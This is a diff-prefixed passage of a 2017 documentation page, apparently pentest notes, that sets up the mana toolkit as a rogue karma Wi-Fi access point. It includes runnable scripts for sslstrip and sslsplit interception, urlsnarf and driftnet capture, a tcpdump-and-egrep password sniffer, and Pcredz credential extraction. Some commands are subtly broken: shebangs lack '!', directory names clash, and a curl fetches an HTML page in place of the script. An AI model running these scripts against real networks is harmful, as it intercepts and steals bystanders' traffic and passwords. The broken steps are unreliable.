+</div>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># create 01_mana-start.sh</span>
+<span class="nb">cd</span> ~/mana/mana-start
+cat <span class="s">&lt;&lt;EOF &gt; 01_mana-start.sh</span>
+<span class="s">#!/bin/bash</span>
+
+<span class="s">SUDO=\$(which sudo)</span>
+<span class="s">[[ &quot;\$USER&quot; == &quot;root&quot; ]] &amp;&amp; SUDO=</span>
+<span class="s">DIR=&quot;\$( cd &quot;\$( dirname &quot;\${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )&quot;</span>
+<span class="s">RUNDIR=\$DIR/../run-mana</span>
+
+<span class="s">echo</span>
+<span class="s">cd \$RUNDIR</span>
+<span class="s">ROUTING=&quot;\$(cat /proc/sys/net/ipv4/ip_forward)&quot;</span>
+<span class="s">HN=&quot;\$(hostname)&quot;</span>
+<span class="s">\$SUDO \$RUNDIR/start-nat-full.sh</span>
+<span class="s">echo &quot;\$ROUTING&quot; &gt; /proc/sys/net/ipv4/ip_forward</span>
+<span class="s">hostname \$HN</span>
+<span class="s">EOF</span>
+
+chmod +x 01_mana-start.sh
+</pre></div>
+</div>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># create 02_mana-urlsnarf.sh</span>
+<span class="nb">cd</span> ~/mana/mana-start
+cat <span class="s">&lt;&lt;EOF &gt; 02_mana-urlsnarf.sh</span>
+<span class="s">#/bin/bash</span>
+
+<span class="s">SUDO=\$(which sudo)</span>
+<span class="s">[[ &quot;\$USER&quot; == &quot;root&quot; ]] &amp;&amp; SUDO=</span>
+<span class="s">DIR=&quot;\$( cd &quot;\$( dirname &quot;\${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )&quot;</span>
+<span class="s">PHY=wlan1</span>
+
+<span class="s">echo</span>
+<span class="s">cd \$DIR</span>
+<span class="s">\$SUDO urlsnarf -i \$PHY</span>
+<span class="s">echo</span>
+<span class="s">EOF</span>
+
+chmod +x 02_mana-urlsnarf.sh
+</pre></div>
+</div>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># create 03_mana-driftnet.sh</span>
+<span class="nb">cd</span> ~/mana/mana-start
+cat <span class="s">&lt;&lt;EOF &gt; 03_mana-driftnet.sh</span>
+<span class="s">#/bin/bash</span>
+
+<span class="s">SUDO=\$(which sudo)</span>
+<span class="s">[[ &quot;\$USER&quot; == &quot;root&quot; ]] &amp;&amp; SUDO=</span>
+<span class="s">DIR=&quot;\$( cd &quot;\$( dirname &quot;\${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )&quot;</span>
+<span class="s">PHY=wlan1</span>
+
+<span class="s">echo</span>
+<span class="s">cd \$DIR</span>
+<span class="s"># \$SUDO echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span>
+<span class="s">\$SUDO driftnet -i \$PHY -d \$DIR/mana-pics</span>
+<span class="s">echo</span>
+<span class="s">EOF</span>
+
+chmod +x 03_mana-driftnet.sh
+</pre></div>
+</div>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># create 04_mana-pw-snarf.sh</span>
+<span class="nb">cd</span> ~/mana/mana-start
+cat <span class="s">&lt;&lt;EOF &gt; 04_mana-pw-snarf.sh</span>
+<span class="s">#/bin/bash</span>
+
+<span class="s">SUDO=\$(which sudo)</span>
+<span class="s">[[ &quot;\$USER&quot; == &quot;root&quot; ]] &amp;&amp; SUDO=</span>
+<span class="s">DIR=&quot;\$( cd &quot;\$( dirname &quot;\${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )&quot;</span>
+<span class="s">PHY=wlan1</span>
+
+<span class="s">echo</span>
+<span class="s">cd \$DIR</span>
+<span class="s">\$SUDO tcpdump -i \$PHY -vv -s 0 -C 500 -W 10 -w \$DIR/mana-pcap.pcap \\</span>
+<span class="s">  port http or port ftp or port smtp or port imap or port pop3 -l -A \\</span>
+<span class="s">  | egrep -i &#39;pass=|pwd=|log=|login=|user=|username=|pw=|passw=\\</span>
+<span class="s">|passwd=|password=|pass:user:|username:|password:|login:|pass |user &#39; \\</span>
+<span class="s">  --color=auto --line-buffered -B20</span>
+<span class="s">echo</span>
+<span class="s">EOF</span>
+
+chmod +x 04_mana-pw-snarf.sh
+</pre></div>
+</div>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># create 05_mana-Pcredz.sh</span>
+<span class="nb">cd</span> ~/mana/mana-start
+cat <span class="s">&lt;&lt;EOF &gt; 05_mana-Pcredz.sh</span>
+<span class="s">#/bin/bash</span>
+
+<span class="s">SUDO=\$(which sudo)</span>
+<span class="s">[[ &quot;\$USER&quot; == &quot;root&quot; ]] &amp;&amp; SUDO=</span>
+<span class="s">DIR=&quot;\$( cd &quot;\$( dirname &quot;\${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )&quot;</span>
+<span class="s">PCAP=mana-pcap.pcap0</span>
+<span class="s">CREDS=CredentialDump-Session.log</span>
+
+<span class="s">echo</span>
+<span class="s">cd &quot;\$DIR&quot;</span>
+<span class="s">while true; do</span>
+<span class="s">  read -p &quot;Do you wish to run Pcredz on \$PCAP?&quot; yn</span>
+<span class="s">  case \$yn in</span>
+<span class="s">    [Yy]* ) \$DIR/Pcredz -f \$PCAP; less \$CREDS; continue;;</span>
+<span class="s">    [Nn]* ) break;;</span>
+<span class="s">    * ) break;;</span>
+<span class="s">  esac</span>
+<span class="s">done</span>
+<span class="s">echo</span>
+<span class="s">EOF</span>
+
+chmod +x 05_mana-Pcredz.sh
+
+<span class="c1"># fetch Pcredz</span>
+<span class="nb">cd</span> ~/mana/start-mana
+curl -O https://github.com/lgandx/PCredz/blob/master/Pcredz
+chmod +x Pcredz
+</pre></div>
+</div>
+<p>Next we get modified versions of the <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> scripts and configuration files:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># modify start-nat-full.sh</span>
+<span class="nv">DIR</span><span class="o">=</span><span class="nv">$HOME</span>/mana/run-mana
+<span class="nv">LOGDIR</span><span class="o">=</span><span class="nv">$DIR</span>/logs
+<span class="nv">SSLSPLITDIR</span><span class="o">=</span><span class="nv">$DIR</span>/sslsplit
+<span class="nb">cd</span> <span class="nv">$DIR</span>
+<span class="nv">SCRIPT</span><span class="o">=</span>start-nat-full.sh
+cp /usr/share/mana-toolkit/run-mana/<span class="nv">$SCRIPT</span> .
+sed -i <span class="s2">&quot;s/^upstream=.*</span>$<span class="s2">/upstream=wlan0/&quot;</span> <span class="nv">$SCRIPT</span>
+sed -i <span class="s2">&quot;s/^phy=.*</span>$<span class="s2">/phy=wlan1/&quot;</span> <span class="nv">$SCRIPT</span>
+sed -i <span class="s2">&quot;s/^conf=.*</span>$<span class="s2">/conf=hostapd-karma.conf/&quot;</span> <span class="nv">$SCRIPT</span>
+sed -i <span class="s2">&quot;s#/var/lib/mana-toolkit/sslstrip.log#&quot;</span><span class="nv">$LOGDIR</span><span class="s2">&quot;/sslstrip.log#&quot;</span> <span class="nv">$SCRIPT</span>
+sed -i <span class="s2">&quot;s#/var/lib/mana-toolkit/sslsplit #&quot;</span><span class="nv">$SSLSPLITDIR</span><span class="s2">&quot; #&quot;</span> <span class="nv">$SCRIPT</span>
+sed -i <span class="s2">&quot;s#/var/lib/mana-toolkit/sslsplit-connect.log#\</span>
+<span class="s2">&quot;</span><span class="nv">$SSLSPLITDIR</span><span class="s2">&quot;/sslsplit-connect.log#&quot;</span> <span class="nv">$SCRIPT</span>
+
+<span class="c1"># modify hostapd-karma.conf</span>
+<span class="nv">CONF</span><span class="o">=</span>hostapd-karma.conf
+cp /etc/mana-toolkit/<span class="nv">$CONF</span> .
+sed -i <span class="s2">&quot;s/^enable_karma=.*</span>$<span class="s2">/enable_karma=1/&quot;</span> <span class="nv">$CONF</span>
+sed -i <span class="s2">&quot;s/^karma_loud=.*</span>$<span class="s2">/karma_loud=0/&quot;</span> <span class="nv">$CONF</span>
+</pre></div>
+</div>
+<p>And we’re all set to go.</p>
+</div>
+<div class="section" id="additional-software-run-with-start-nat-full-sh">
+<h3>6.6.3.2. Additional software run with <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code><a class="headerlink" href="#additional-software-run-with-start-nat-full-sh" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="http://linux.die.net/man/8/urlsnarf/">urlsnarf</a> extracts HTTP traffic from a live network interface or a pcap file.</p>
+<p><a class="reference external" href="http://www.ex-parrot.com/~chris/driftnet/">driftnet</a> picks out images from TCP streams from a live network interface or a pcap file. Files get deleted when terminated.</p>
+<p><a class="reference external" href="https://github.com/lgandx/PCredz/">Pcredz</a> to find cracked passwords.</p>
+</div>
+<div class="section" id="run-start-nat-full-sh">
+<h3>6.6.3.3. Run <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code><a class="headerlink" href="#run-start-nat-full-sh" title="Permalink to this headline">¶</a></h3>
+<p>Now we can start the <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> demo by simply running <code class="docutils literal"><span class="pre">./run-all.sh</span></code>.</p>
+</div>
+<div class="section" id="undo-changes-getting-back-to-normal-kali-networking">
+<h3>6.6.3.4. Undo changes - getting back to normal Kali networking<a class="headerlink" href="#undo-changes-getting-back-to-normal-kali-networking" title="Permalink to this headline">¶</a></h3>
+<p>When done with the <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> demo, follow the cleanup part of <a class="reference internal" href="../kali/networking.html#movewireless2networking"><span class="std std-ref">Move wireless from NetworkManager to networking</span></a>.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="nmap.html" class="btn btn-neutral float-right" title="6.7. nmap" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="drive_droid_kon-boot.html" class="btn btn-neutral" title="6.5. DriveDroid &amp; Kon-Boot" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
